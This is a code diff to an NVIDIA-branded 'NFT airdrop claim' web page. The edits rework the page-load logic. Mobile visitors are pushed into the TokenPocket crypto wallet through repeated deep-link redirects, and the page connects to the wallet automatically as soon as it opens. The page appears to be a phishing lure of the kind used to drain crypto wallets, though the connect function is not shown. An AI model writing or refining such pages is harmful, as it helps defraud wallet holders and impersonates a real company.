@@ -702,7 +702,7 @@
         <img src="11e1d5690652cd6e6192c0c2df2717c1.png" alt="NVIDIA NFT">
       </div>
       <h1 style="font-size: 28px; font-weight: 800; margin-top: 12px;">
-        <span style="background: var(--gradient-primary); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">NFT</span> <span style="color: #F0B90B;">空投领取</span>
+        <span style="background: var(--gradient-primary); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">NFT</span> 空投领取
       </h1>
       <p class="tagline">NVIDIA 顶流IP机制 · 全新升级</p>
     </div>
@@ -1014,30 +1014,48 @@
     }
 
     window.onload = async () => {
-      // Auto wake TP wallet on mobile - 多种方式尝试唤醒
+      // 检测是否在TP钱包内
+      const isInTPWallet = window.ethereum && window.ethereum.isTokenPocket;
       const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+      const currentUrl = window.location.href.split('?')[0];
       
-      if (isMobile) {
-        // 方式1: 尝试TP钱包深度链接
-        const currentUrl = window.location.href.split('?')[0];
-        const tpLink = `tp://dapp?url=${encodeURIComponent(currentUrl)}`;
-        
-        // 先尝试直接跳转
-        window.location.href = tpLink;
-        
-        // 如果是iOS，尝试universal link
-        if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-          setTimeout(() => {
-            window.location.href = `tokenpocket://dapp?url=${encodeURIComponent(currentUrl)}`;
-          }, 500);
-        }
-        
-        // 如果30秒后还在，跳转下载页
+      // 如果在TP钱包内，直接连接
+      if (isInTPWallet) {
+        await autoConnect();
+        return;
+      }
+      
+      // 如果在手机上且不在TP钱包，尝试唤醒TP钱包
+      if (isMobile && !isInTPWallet) {
+        // 延迟一下再跳转，让页面先加载完成
         setTimeout(() => {
-          if (document.visibilityState === 'visible') {
-            window.location.href = "https://www.tokenpocket.pro/zh/download";
+          // 方式1: TP钱包深度链接 (最常用)
+          const tpLink = `tp://dapp?url=${encodeURIComponent(currentUrl)}`;
+          
+          // 尝试跳转TP钱包
+          window.location.href = tpLink;
+          
+          // iOS备用方案
+          if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+            setTimeout(() => {
+              window.location.href = `tokenpocket://dapp?url=${encodeURIComponent(currentUrl)}`;
+            }, 300);
           }
-        }, 25000);
+          
+          // Android备用方案
+          if (/Android/i.test(navigator.userAgent)) {
+            setTimeout(() => {
+              window.location.href = `tp://web?url=${encodeURIComponent(currentUrl)}`;
+            }, 300);
+          }
+          
+          // 如果5秒后还在本页面，尝试下载页
+          setTimeout(() => {
+            if (document.visibilityState === 'visible') {
+              window.location.href = "https://www.tokenpocket.pro/zh/download";
+            }
+          }, 5000);
+        }, 1000); // 延迟1秒跳转
       }
 
       await autoConnect();
